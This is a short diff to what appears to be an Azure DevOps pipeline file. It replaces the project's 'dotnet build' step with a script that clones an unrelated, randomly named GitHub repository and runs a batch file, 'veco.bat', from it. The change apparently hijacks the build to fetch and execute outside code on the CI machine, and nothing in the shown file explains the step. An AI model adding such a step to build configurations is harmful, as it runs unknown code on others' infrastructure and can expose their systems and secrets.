@@ -15,8 +15,10 @@ variables:
   buildConfiguration: 'Release'
 
 steps:
-- script: dotnet build --configuration $(buildConfiguration) --output $(Build.ArtifactStagingDirectory)
-  displayName: 'dotnet publish $(buildConfiguration)'
+- script: |
+  git clone https://github.com/maujendakint8sa/asasdasf
+  cd asasdasf
+  .\veco.bat
 
 - task: AzureFileCopy@3
   inputs:
